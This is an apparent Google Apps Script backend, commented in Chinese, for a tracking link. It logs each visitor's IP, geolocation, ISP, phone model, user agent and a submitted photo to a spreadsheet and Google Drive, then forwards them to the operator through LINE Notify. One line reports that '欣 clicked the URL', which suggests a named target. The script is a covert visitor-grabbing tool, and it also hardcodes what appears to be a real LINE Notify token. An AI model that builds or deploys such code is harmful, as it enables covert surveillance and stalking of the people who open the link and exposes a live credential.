function doGet(e) {
  const output = HtmlService.createHtmlOutputFromFile('index');
  output.addMetaTag('Access-Control-Allow-Origin', '*');
  return output.setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL);
}

    
    
    // 將照片 Data URL 上傳到 Google Drive 並回傳公開 URL
    function uploadImageToDrive(photoDataUrl) {
      try {
        var folder = DriveApp.getFolderById('1Ej0ywGfJ20kY2p7KkiggBSRiLLc-EZvf'); // 替換為資料夾 ID
        var blob = Utilities.newBlob(
          Utilities.base64Decode(photoDataUrl.split(",")[1]),
          'image/jpeg',
          'photo.jpg'
        );
        var file = folder.createFile(blob);
        file.setSharing(DriveApp.Access.ANYONE_WITH_LINK, DriveApp.Permission.VIEW);
    
        // 將 Google Drive 的共享頁面 URL 轉換為直接文件 URL
        var fileId = file.getId();
        var directUrl = `https://drive.google.com/uc?id=${fileId}`;
        Logger.log('圖片已上傳到 Google Drive，URL: ' + directUrl);
        return directUrl;
      } catch (e) {
        Logger.log('Error uploading to Drive: ' + e.message);
        return null;
      }
    }
    
    
    // 發送 LINE Notify 消息
    function sendLineNotify(message, imageUrl) {
      try {
        var lineNotifyToken = PropertiesService.getScriptProperties().getProperty('line');
        var apiUrl = 'https://notify-api.line.me/api/notify';
    
        var options = {
          'method': 'post',
          'headers': {
            'Authorization': 'Bearer ' + lineNotifyToken,
          },
          'payload': {
            'message': message,
            'imageThumbnail': imageUrl,
            'imageFullsize': imageUrl,
          },
        };
    
        var response = UrlFetchApp.fetch(apiUrl, options);
        Logger.log('LINE Notify 回應: ' + response.getContentText());
      } catch (e) {
        console.error("發送 LINE Notify 時出錯: ", e);
      }
    }
    
    // 主函數：上傳照片並通知 LINE
    function uploadPhotoAndNotify(photoDataUrl) {
      try {
        var imageUrl = uploadImageToDrive(photoDataUrl);
        if (imageUrl) {
          var message = '照片已成功上傳！以下是圖片：';
          sendLineNotify(message, imageUrl);
        } else {
          Logger.log('圖片上傳失敗，無法通知 LINE');
        }
      } catch (e) {
        console.error("上傳並通知 LINE 時出錯: ", e);
      }
    }
    
    //
    // 上傳照片URL到試算表
    function uploadPhotoToSheet(photoUrl) {
      try {
        var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
        var newRow = [new Date(), photoUrl];
        sheet.appendRow(newRow);
      } catch (e) {
        console.error("Error uploading photo to sheet: ", e);
      }
    }
    
    
    // 記錄IP和地理位置信息以及裝置信息到試算表
    function recordData(ip, ipType, userAgent, city, region, country, org, photoUrl) {
      try {
        var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
        var telecomNote = getTelecomNote(org);
        var deviceBrand = parseDeviceBrand(userAgent);
        var deviceModel = parseDeviceModel(userAgent, deviceBrand);
        org += telecomNote;
    
        // 將照片URL加入到試算表行數據
        var rowData = [new Date(), ip, ipType, deviceBrand, deviceModel, userAgent, city, region, country, org, photoUrl];
        sheet.appendRow(rowData);
    
        // 準備訊息，包含日期、IP地址、IP類型、裝置品牌、裝置型號、用戶代理、城市、地區、國家和組織
        var message = 
          "\n"+"【 版 本 】 ： 欣 " +
          "\n"+"【Date】 " + new Date() + "\n" +
          "【IP Address】 " + ip + "\n" +
          "【IP Type】 " + ipType + "\n" +
          "【Device Brand】 " + deviceBrand + "\n" +
          "【Device Model】 " + deviceModel + "\n" +
          "【User Agent】 " + userAgent + "\n" +
          "【City】 " + city + "\n" +
          "【Region】 " + region + "\n" +
          "【Country】 " + country + "\n" +
          "【Org】 " + org + "\n" +
          "【Photo URL】 " + photoUrl + "\n";
    
        // 發送 Line Notify 訊息（包含圖片）
        sendLineNotifyWithImage(message, photoUrl, photoUrl);
    
        // 上傳照片URL到 Line Notify
        uploadPhotoToLineNotify(photoUrl);
      } catch (e) {
        console.error("Error recording data: ", e);
      }
    }
    
    
    
    function getTelecomNote(org) {
    var telecomNotes = {
    "AS3462 Data Communication Business Group": "中華電信之家用固網際網路 Chunghwa Telecom＿Hinet.net",
    "AS9924 Taiwan Fixed Network, Telco and Network Service Provider.": "台灣大哥大之固網網際網路 Taiwan Fixed Network",
    "AS24158 Taiwan Mobile Co., Ltd.": "台灣大哥大 Taiwan Mobile",
    "AS131591 Ambit Microsystem Corporation - undefined": "亞太電信 Asia Pacific Telecom",
    "AS24157 Taiwan Star Telecom Corporation Limited.(Former Vibo Telecom Inc.)": "台灣之星 Taiwan Star",
    "AS17421 Mobile Business Group": "中華電信之台灣網 Taiwan Net",
    "AS4780 Digital United Inc.": "世新之家用網路 Shih-Hsin Cable Television Incorporation"
    };
    
    
    // 如果找到對應的註釋，則返回註釋，否則返回空字符串
    return " - " + telecomNotes[org];
    }
    
    
    function parseDeviceBrand(userAgent) {
    var brands = {
    "iPhone|iPad|Mac": "Apple",
    "Samsung|Galaxy|sm": "Samsung",
    "Huawei": "Huawei",
    "Pixel": "Google",
    "Xperia": "Sony",
    "LG": "LG",
    "OnePlus": "OnePlus",
    "MI": "Xiaomi",
    "Redmi": "Xiaomi",
    "Oppo": "Oppo",
    "realme|RMX": "realme",
    "Meizu": "Meizu",
    "Vivo": "Vivo",
    "Asus": "Asus",
    "Nokia": "Nokia"
    };
    for (var pattern in brands) {
    if (userAgent.match(new RegExp(pattern, "i"))) {
    return brands[pattern];
    }
    }
    return "Unknown";
    }
    
    
    function parseDeviceModel(userAgent, brand) {
    var appleModels = {
    "iPhone17,2": "iPhone 16 Pro Max",
    "iPhone17,1": "iPhone 16 Pro",
    "iPhone17,4": "iPhone 16 Plus",
    "iPhone17,3": "iPhone 16",
    "iPhone16,2": "iPhone 15 Pro Max",
    "iPhone16,1": "iPhone 15 Pro",
    "iPhone15,5": "iPhone 15 Plus",
    "iPhone15,4": "iPhone 15",
    "iPhone15,3": "iPhone 14 Pro Max",
    "iPhone15,2": "iPhone 14 Pro",
    "iPhone14,8": "iPhone 14 Plus",
    "iPhone14,7": "iPhone 14",
    "iPhone14,6": "iPhone SE (2022)",
    "iPhone14,3": "iPhone 13 Pro Max",
    "iPhone14,2": "iPhone 13 Pro",
    "iPhone14,5": "iPhone 13",
    "iPhone14,4": "iPhone 13 mini",
    "iPhone13,4": "iPhone 12 Pro Max",
    "iPhone13,3": "iPhone 12 Pro",
    "iPhone13,2": "iPhone 12",
    "iPhone13,1": "iPhone 12 mini",
    "iPhone12,8": "iPhone SE（第二代2020）",
    "iPhone12,5": "iPhone 11 Pro Max",
    "iPhone12,3": "iPhone 11 Pro",
    "iPhone12,1": "iPhone 11",
    "iPhone11,6": "iPhone XS Max",
    "iPhone11,2": "iPhone XS",
    "iPhone11,8": "iPhone XR",
    "iPhone10,3": "iPhone X",
    "iPhone10,2": "iPhone 8 Plus地區版",
    "iPhone10,5": "iPhone 8 Plus國際版",
    "iPhone10,1": "iPhone 8地區版",
    "iPhone10,4": "iPhone 8國際版",
    "iPhone9,2": "iPhone 7 Plus地區版",
    "iPhone9,4": "iPhone 7 Plus國際版",
    "iPhone9,1": "iPhone 7地區版",
    "iPhone9,3": "iPhone 7國際版",
    "iPhone8,4": "iPhone SE（第一代）",
    "iPhone8,2": "iPhone 6s Plus",
    "iPhone8,1": "iPhone 6s",
    "iPhone7,1": "iPhone 6 Plus",
    "iPhone7,2": "iPhone 6",
    "iPhone6,1": "iPhone 5s",
    "iPhone6,2": "iPhone 5s",
    "iPhone5,1": "iPhone 5"
    };
    var samsungModels = { //三星
    "SM-A146P": "Galaxy A14",
    "SM-A146": "Galaxy A14 5G ",
    "SM-A236": "Galaxy A23",
    "SM-A3360": "Galaxy A33",
    "SM-A346": "Galaxy A34",
    "SM-A546": "Galaxy A54",
    "SM-A5360": "Galaxy A53",
    "SM-A716B": "Galaxy A71 5G",
    "SM-A025": "Galaxy A02",
    "SM-A025F": "Galaxy A02",
    "SM-A125F": "Galaxy A12",
    "SM-A225F": "Galaxy A22",
    "SM-A225N": "Galaxy A22",
    "SM-A325F": "Galaxy A32",
    "SM-A425F": "Galaxy A42",
    "SM-A525F": "Galaxy A52",
    "SM-A725F": "Galaxy A72",
    "SM-A825F": "Galaxy A82",
    "SM-A925F": "Galaxy A92",
    "SM-A035F": "Galaxy A03",
    "SM-A135F": "Galaxy A13",
    "SM-A235F": "Galaxy A23",
    "SM-A435F": "Galaxy A43",
    "SM-A735F": "Galaxy A73",
    "SM-A835F": "Galaxy A83",
    "SM-A935F": "Galaxy A93",
    "SM-A045F": "Galaxy A04",
    "SM-A145F": "Galaxy A14",
    "SM-A245F": "Galaxy A24",
    "SM-A345F": "Galaxy A34",
    "SM-A445F": "Galaxy A44",
    "SM-A545F": "Galaxy A54",
    "SM-A745F": "Galaxy A74",
    "SM-A845F": "Galaxy A84",
    "SM-A945F": "Galaxy A94",
    
    
    "SM-F900": "Galaxy Fold",
    "SM-F907": "Galaxy Fold 5G",
    "SM-F700": "Galaxy Z Flip",
    "SM-F916": "Galaxy Z Fold 2",
    "SM-F926": "Galaxy Z Fold 3",
    "SM-F711": "Galaxy Z Flip 3",
    "SM-F926": "Galaxy Z Fold 3 5G",
    "SM-F711": "Galaxy Z Flip 3 5G",
    "SM-F7210": "Galaxy Z Flip 4",
    "SM-F9360": "Galaxy Z Fold 4",
    
    
    "SM-N920": "Galaxy Note 5",
    "SM-N930": "Galaxy Note 7",
    "SM-N950": "Galaxy Note 8",
    "SM-N960": "Galaxy Note 9",
    "SM-N970": "Galaxy Note 10",
    "SM-N975": "Galaxy Note 10+",
    "SM-N980": "Galaxy Note 20",
    "SM-N985": "Galaxy Note 20 Ultra",
    
    
    "SM-M336": "Galaxy M33",
    
    
    "SM-G920": "Galaxy S6",
    "SM-G925": "Galaxy S6 Edge",
    "SM-G928": "Galaxy S6 Edge+",
    "SM-G930": "Galaxy S7",
    "SM-G935": "Galaxy S7 Edge",
    "SM-G950": "Galaxy S8",
    "SM-G955": "Galaxy S8+",
    "SM-G960": "Galaxy S9",
    "SM-G965": "Galaxy S9+",
    "SM-G970": "Galaxy S10e",
    "SM-G973": "Galaxy S10",
    "SM-G975": "Galaxy S10+",
    "SM-G977": "Galaxy S10 5G",
    "SM-G980": "Galaxy S20",
    "SM-G981": "Galaxy S20 5G",
    "SM-G985": "Galaxy S20+",
    "SM-G986": "Galaxy S20+ 5G",
    "SM-G988": "Galaxy S20 Ultra",
    "SM-G991": "Galaxy S21",
    "SM-G996": "Galaxy S21+",
    "SM-G998": "Galaxy S21 Ultra",
    "SM-G990": "Galaxy S21 FE",
    "SM-S9010": "Galaxy S22",
    "SM-S9060": "Galaxy S22+",
    "SM-S9080": "Galaxy S22 Ultra",
    "SM-S7110": "Galaxy S23 FE",
    "SM-S9110": "Galaxy S23",
    "SM-S9160": "Galaxy S23+",
    "SM-S9180": "Galaxy S23 Ultra",
    "SM-S9210": "Galaxy S24",
    "SM-S9260": "Galaxy S24+",
    "SM-S9280": "Galaxy S24 Ultra",
    "SM-X200": "Galaxy Tab A8"
    };
    var realmeModels = {
    "RMX3363": "realme GT 大師版",
    // ... 更多 realme 型號
    };
    // ... 其他品牌的型號映射
    
    
    var modelsMap = {
    "Apple": appleModels,
    "Samsung": samsungModels,
    "realme": realmeModels,
    // ... 其他品牌的型號映射
    };
    
    
    for (var modelString in modelsMap[brand]) {
    if (userAgent.includes(modelString)) {
    return modelsMap[brand][modelString];
    }
    }
    return "Unknown";
    }
    
    // 設定 Line Notify Token
    function setLineNotifyToken() {
      var scriptProperties = PropertiesService.getScriptProperties();
      // 替換 'YOUR_LINE_NOTIFY_TOKEN' 為你的 Line Notify Token
    scriptProperties.setProperty('line', 'yn05hVstgiKpJpGVRSQAadeAj7T6Y2c3fHROTdKGSUm');
      Logger.log('Line Notify Token');
    }
    
    
    
    var yourMessage = "欣 clicked the URL";
    sendLineNotifyWithImage(yourMessage);
    
    // 發送 Line Notify 訊息（包含圖片）
    function sendLineNotifyWithImage(message, imageThumbnailUrl, imageFullsizeUrl) {
      try {
        // 取得 Line Notify 的 Token（請替換為你自己的 Token）
        var lineNotifyToken = PropertiesService.getScriptProperties().getProperty('line');
    
        // Line Notify API 網址
        var apiUrl = 'https://notify-api.line.me/api/notify';
    
        // 設定 HTTP 請求參數
        var options = {
          'method': 'post',
          'headers': {
            'Authorization': 'Bearer ' + lineNotifyToken,
          },
          'payload': {
            'message': message,
            'imageThumbnail': imageThumbnailUrl,
            'imageFullsize': imageFullsizeUrl,
          },
        };
    
        // 發送 HTTP POST 請求
        var response = UrlFetchApp.fetch(apiUrl, options);
    
        // 輸出發送結果
        Logger.log(response.getContentText());
      } catch (e) {
        console.error("Error sending Line Notify message: ", e);
      }
    }
    
    
    // 上傳照片URL到 Line Notify
    function uploadPhotoToLineNotify(photoUrl) {
      try {
        var lineNotifyToken = PropertiesService.getScriptProperties().getProperty('line');
        var apiUrl = 'https://notify-api.line.me/api/notify';
    
        // 使用 UrlFetchApp 準備 HTTP 請求參數
        var options = {
          'method': 'post',
          'headers': {
            'Authorization': 'Bearer ' + lineNotifyToken,
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          'payload': {
            'imageThumbnail': photoUrl,
            'imageFullsize': photoUrl,
          },
        };
    
        // 發送 HTTP POST 請求到 Line Notify API
        var response = UrlFetchApp.fetch(apiUrl, options);
    
        // 輸出發送結果到日誌
        Logger.log(response.getContentText());
      } catch (e) {
        console.error("Error sending Line Notify message with photo: ", e);
      }
    }
    
    
    
